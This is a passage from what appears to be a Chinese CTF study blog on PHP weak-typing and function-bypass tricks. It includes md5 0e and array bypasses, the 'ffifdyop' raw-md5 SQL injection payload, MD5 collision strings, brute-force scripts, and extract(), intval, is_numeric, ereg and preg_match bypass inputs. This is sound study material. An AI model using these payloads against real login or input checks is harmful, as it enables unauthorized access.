class="line">“hh-2e2”=0</span><br><span class="line">“1hh-2e2”=1</span><br></pre></td></tr></table></figure><p><img src="https://www.runoob.com/wp-content/uploads/2019/05/1791863413-572055b100304_articlex.png" alt="img"></p><p>bool类型的true跟任意字符串可以弱类型相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">true</span> = “H1TerHub”)&#123;</span><br><span class="line"><span class="keyword">echo</span> “success”;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="强-弱比较"><a href="#强-弱比较" class="headerlink" title="强|弱比较"></a>强|弱比较</h2><ul><li><p>强比较<code>===</code>：先比较类型是否相同；再比较值</p></li><li><p>弱类型比较<code>==</code>：会将字符类型转换为相同类型，在比较值</p><p>ps：若比较数字和字符串 | 涉及数字内容的字符串；则字符串会转换为数值并按数值进行比较</p></li></ul><blockquote><p>eg：</p><p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内 该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);    <span class="comment">//true         </span></span><br><span class="line"><span class="comment"># admin为字符串，转换即为0var_dump(&quot;1admin&quot;==1);   //true            </span></span><br><span class="line"><span class="comment"># 字符串中的数值的开始部分决定了其值var_dump(&quot;admin1&quot;==1)    //false         </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>)    <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true </span></span><br><span class="line"><span class="comment"># 将0e|0E识别为科学计数法；而0的n次方始终为0，故相等Copy</span></span><br></pre></td></tr></table></figure></blockquote><p><a href="https://www.php.net/manual/zh/types.comparisons.php">PHP: PHP 类型比较表 - Manual</a></p><h2 id="一些php函数"><a href="#一些php函数" class="headerlink" title="一些php函数"></a>一些php函数</h2><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br></pre></td></tr></table></figure><ul><li>String: 必需，为要计算的字符串</li><li>Raw:<ul><li>true： 原始16字符二进制格式</li><li>false：32字符十六进制数（默认）</li></ul></li></ul><p>利用md5($pass,true)构造万能密码sql注入</p><p>后端查询语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">where</span> password<span class="operator">=</span>md5($pass,<span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>若MD5值经hex转换为字符串后为’or’+balabala这样的字符串；那么拼接的查询语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `admin` <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;balabala&#x27;</span></span><br></pre></td></tr></table></figure><p>当’or’后的值为true时，即可构成万能密码；在此利用到一个mysql特性： <code>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数</code>（测试时发现只要是数字都可以） (ps：这种情况必须有单引号括起来 如<code>password=&#39;xxx&#39; or &#39;1xxxxxxxxx&#39;</code>就相当于<code>password=&#39;xxx&#39; or 1</code>；故返回值为true)</p><p>常用payload：<code>ffifdyop</code></p><h5 id="md5强碰撞脚本"><a href="#md5强碰撞脚本" class="headerlink" title="md5强碰撞脚本"></a>md5强碰撞脚本</h5><p><a href="https://segmentfault.com/a/1190000039189857">浅谈md5弱类型比较和强碰撞 - 合天网安</a></p><h5 id="弱比较bypass"><a href="#弱比较bypass" class="headerlink" title="弱比较bypass"></a>弱比较bypass</h5><p>md5弱比较形式：<br><code>if($a != $b &amp;&amp; md5($a) == md5($b))</code><br>这里有两种方法</p><ul><li>0e绕过</li><li>数组绕过</li></ul><p>0e绕过：是md5加密后是0exxxxx的形式，在==弱比较时，会被当做科学技术法，众所周知，0的任何次方都是0，自然判断为true<br>大佬整理的<a href="https://github.com/spaze/hashes/blob/master/md5.md">md5加密后0e开头</a></p><p>数组绕过：a[]=a&amp;b[]=b，传入参数为数组则MD5返回NULL，null=null，判断为true，成功绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">一些md5编码后得到<span class="number">0</span>exxx（此处xxx为十进制字符）的字符串</span><br><span class="line">原字符串                    md5值</span><br><span class="line">QNKCDZO         <span class="number">0e830400451993494058024219903391</span></span><br><span class="line"><span class="number">240610708</span>       <span class="number">0e462097431906509019562988736854</span></span><br><span class="line">aabg7XSs        <span class="number">0e087386482136013740957780965295</span></span><br><span class="line">aabC9RqS        <span class="number">0e041022518165728065344349536299</span></span><br><span class="line">s878926199a     <span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a     <span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a     <span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a     <span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a     <span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a    <span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a    <span class="number">0e509367213418206700842008763514</span></span><br><span class="line">qebi7zl0        <span class="number">0e649420541288950724577306786996</span></span><br><span class="line">qebaur5g        <span class="number">0e352312259284787676841028696030</span></span><br><span class="line">qe20k7jl        <span class="number">0e416004725936696827118806457976</span></span><br><span class="line">qe9vwdjf        <span class="number">0e288029216666843876260611249898</span></span><br></pre></td></tr></table></figure><p>补一些脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成md5值为0exxx，还有一些套娃关卡的第一关也是要求验证码，改一下就能用了</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">l = <span class="string">&#x27;qwertyuiopasdfghjklzxcvbnm1234567890&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> l:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> l:    </span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> l:        </span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> l:            </span><br><span class="line">                    <span class="keyword">for</span> o <span class="keyword">in</span> l:                </span><br><span class="line">                        <span class="keyword">for</span> p <span class="keyword">in</span> l:                    </span><br><span class="line">                            <span class="keyword">for</span> q <span class="keyword">in</span> l:                        </span><br><span class="line">                                f = i + j + k + m + n + o + p + q                        </span><br><span class="line">                                md5 = hashlib.md5(f.encode(encoding=<span class="string">&#x27;UTF-8&#x27;</span>)).hexdigest()                        </span><br><span class="line">                                <span class="keyword">if</span> md5[:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> <span class="built_in">str</span>.isdigit(md5[<span class="number">2</span>:]):                            </span><br><span class="line">                                    <span class="built_in">print</span>(f)                            </span><br><span class="line">                                    <span class="built_in">print</span>(md5)</span><br></pre></td></tr></table></figure><p><strong>加密后弱相等</strong></p><p>形式如下：<br><code>if ($md5==md5($md5))</code><br>可以找0e开头并且md5后仍然0e开头的字符串，这样0==0,就可以绕过了。<br>这里可以用0e215962017。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0e215962017</span></span><br><span class="line"><span class="keyword">import</span> hashlibfor </span><br><span class="line">i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>**<span class="number">41</span>):   </span><br><span class="line">    i=<span class="string">&#x27;0e&#x27;</span>+<span class="built_in">str</span>(i)   </span><br><span class="line">    md5=hashlib.md5(i.encode()).hexdigest() </span><br><span class="line">    <span class="keyword">if</span> md5[:<span class="number">2</span>]==<span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():     </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;md5:&#123;&#125; &#x27;</span>.<span class="built_in">format</span>(i))      </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h5 id="强比较bypass"><a href="#强比较bypass" class="headerlink" title="强比较bypass"></a>强比较bypass</h5><p>md5强比较形式：<br><code>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))</code><br>0e绕过不能用了，因为强比较时，0exxx不再被当做科学计数法，而是被当做字符串。<br>数组绕过仍然可以。</p><ul><li><p>数组绕过</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg：(md5($id) === md5($gg) &amp;&amp; $id !== $gg)直接数组绕过：?id[]=1&amp;gg[]=2</span><br></pre></td></tr></table></figure></li><li><p>还有最近碰到的：</p><p>md5强碰撞：<a href="https://blog.csdn.net/EC_Carrot/article/details/109525162">md5强碰撞</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a1&#x27;</span>]!==(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a2&#x27;</span>])&#125;</span><br><span class="line"><span class="comment"># 最后转换为字符串比较，因此使用数组就不可行了</span></span><br><span class="line">(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]))===<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"><span class="comment"># implode()会先把数组元素拼接成字符串再进行md5加密，使用数组就不可行了</span></span><br></pre></td></tr></table></figure><p>只能使用两组MD5值相同的不同字符串了，这里可以用脚本跑， 下面是url编码过后的值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2&amp;b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></figure></li></ul><h4 id="substr-、sha1-、base64-decode"><a href="#substr-、sha1-、base64-decode" class="headerlink" title="substr()、sha1()、base64_decode"></a>substr()、sha1()、base64_decode</h4><p><code>substr()</code>、<code>sha1()</code>、<code>base64_decode()</code>只能处理传入的字符串数据 当传入数组后会报出Warning错误，但仍会正常运行并返回值，当==左右两边都错误时，并且正常运行返回相同的值，就可以是判定条件成立</p><p>bypass：对<code>substr()</code>、<code>sha1()</code>、<code>base64_decode()</code>传入数组则返回null</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=[];<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>, <span class="number">123</span>));        <span class="comment">//NULL</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>));                     <span class="comment">//NULL</span></span><br><span class="line"><span class="comment"># sha1后为0e数字的值：aaroZmOk aaO8zKZF aaK1STfY</span></span><br><span class="line"><span class="comment"># aaK1STfY  0e76658526655756207688271159624026011393</span></span><br><span class="line"><span class="comment"># aaO8zKZF  0e89257456677279068558073954252716165668</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>, <span class="number">123</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$cc</span>));    <span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure><h4 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h4><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$auth</span>==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxx&#125;!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract() 函数</p><p>从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。为了拿到flag，需要auth值为1，此处我们利用extract()变量覆盖的缺陷，将auth覆盖为1。</p><h4 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h4><p>获取变量的整数值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval ( mixed $value , int $base = 10 ) : int</span><br></pre></td></tr></table></figure><p>value：要转换的数量值，base：转换所用进制</p><p>三个特性：</p><ul><li><p>成功：返回var的整数值； 失败 or 空数组：返回0； 非空数组：返回1</p></li><li><p>如果 <code>base</code> 是 0，通过检测 <code>value</code> 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul></li><li><p>base为0，变量在遇上数字或正负符号才做转换，遇到非数字或字符串结束时以(\0)结束转换，ps：前提是进行弱类型比较</p><blockquote><p>默认遇到<code>非数字字符</code>就会停止识别 如：<code>intval($_GET[1])</code>传入1=666aa；intval得到结果为666</p><p> Intval在处理字符串型的科学计数法时只输出e前的数字，而+1后又作为数字处理</p><p>echo intval(1e10); -&gt;10000000000</p><p>echo intval(“1e10”); -&gt;1</p><p>echo intval(“1e10”+1); -&gt;10000000001</p></blockquote></li></ul><h4 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h4><p><strong>is_numeric()</strong> ：判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。</p><p>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断因此输入%20password在解析变量名就会变成password</p><p><strong>bypass</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=<span class="number">1234567</span>%<span class="number">20</span>passwd=<span class="number">1234567</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure><p>此外：在某些cms中，会利用如下代码检测用户输入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 该片段判断参数s是否为数字，是则带入数据库查询，不是则返回0</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;  </span><br><span class="line"><span class="comment">//是 values($s) 不是values(&#x27;$s&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>但可以将sql语句转换为16进制传给参数</p><p><a href="https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg"><img src="https://i.loli.net/2021/03/10/yamFEb2WUMnvKi1.jpg" alt="img"></a></p><h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">in_array</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> [, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">FALSE</span> ] )</span><br></pre></td></tr></table></figure><p>ps：strict相当于是否开启强比较</p><ul><li>不提供strict参数 (即默认为<code>false</code>)时，会进行<code>松散比较</code>，判断needle是否在数组haystack中</li><li>strict=<code>true</code>；还会比较needle和haystack中<code>元素类型是否相同</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span>=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;3&#x27;</span>];<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;abc&#x27;</span>, <span class="variable">$array</span>));  <span class="comment">//true   </span></span><br><span class="line"><span class="comment"># &#x27;abc&#x27;转换为0</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;1bc&#x27;</span>, <span class="variable">$array</span>));  <span class="comment">//true  </span></span><br><span class="line"><span class="comment"># &#x27;1bc&#x27;转换为1</span></span><br><span class="line"><span class="comment"># 转换整型int/浮点型float会返回元素个数；</span></span><br><span class="line"><span class="comment"># 转换bool返回Array中是否有元素；</span></span><br><span class="line"><span class="comment"># 转换成string返回&#x27;Array&#x27;，并抛出warning</span></span><br></pre></td></tr></table></figure><p><strong>array_search()和in_array()类似</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;4admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(0)=&gt; 返回键值1</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;1admin&quot;</span>,<span class="variable">$a</span>)); <span class="comment">// int(1) ==&gt;返回键值0</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//这个和之前的类型转换类似，但是如果是array_search(“4admin”,$a,true),最后的“true”会禁止类型转换。</span></span><br></pre></td></tr></table></figure><h4 id="json"><a href="#json" class="headerlink" title="json()"></a>json()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;*********&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$message</span>-&gt;key == <span class="variable">$key</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;~~~~&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于<br><code>$key</code>的值，但是<code>$key</code>的值我们不知道</p><p>这时我们构造一个和任意字符串返回为真的数组{“key”:true}。即可绕过</p><p>payload=message={“key”,true}</p><h4 id="ereg"><a href="#ereg" class="headerlink" title="ereg()"></a>ereg()</h4><p>正则表达式匹配，在php7.0.0版本后被去除</p><p>存在NULL截断漏洞，可以使用%00截断来绕过正则匹配~</p><blockquote><p>像ctfshow web108</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ereg(&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE))</span><br></pre></td></tr></table></figure><p>就可以用 <code>a%00</code>来绕过，在%00后就可以任意传入了</p></blockquote><h4 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h4><ol><li>preg_match只能处理字符串，当传入数组时会返回false</li><li><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></li><li><code>.</code>不会匹配换行符； eg:<code>preg_match(&#39;/^.*(flag).*$/&#39;, $a)</code>可令<code>a=&quot;\nflag&quot;</code> 而非多行模式下，<code>$</code>会忽略末尾的<code>%0a</code>即空字符； eg:<code>preg_match(&#39;/^flag$/&#39;, $_GET[&#39;a&#39;]) &amp;&amp; $_GET[&#39;a&#39;] !== &#39;flag&#39;</code>可输入<code>a=flag%0a</code></li></ol><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><blockquote><p><a href="https://www.php.net/manual/zh/function.eval">PHP: eval - Manual</a> eval — 把字符串作为PHP代码执行：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string `$code`): [mixed]</span><br></pre></td></tr></table></figure><p>code为要执行的字符串，传入的代码不能包含打开/关闭PHP tags；且要以分号结尾</p><p>（实际可以把eval($code)的效果看成将$code这部分直接插入到php代码里~）</p><blockquote><p>eval是语言构造器而不是一个函数，不能被可变函数调用</p><p>可变函数即变量名加括号，PHP系统会尝试解析成函数，如果有当前变量中的值为命名的函数，就会调用。如果没有就报错。 · 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require eval() 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数</p></blockquote></blockquote><h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><blockquote><p><a href="https://www.php.net/manual/zh/function.assert">PHP: assert - Manual</a></p><p>assert把整个字符串当作php代码执行，而eval是把合法的php代码执行</p><p>在PHP7.1版本以后， assert()默认不再可以执行代码 (assert在更新后无法将使用字符串作为参数，而GET或POST传入的数据默认就是字符串类型）</p></blockquote><h4 id="preg-replace"><a 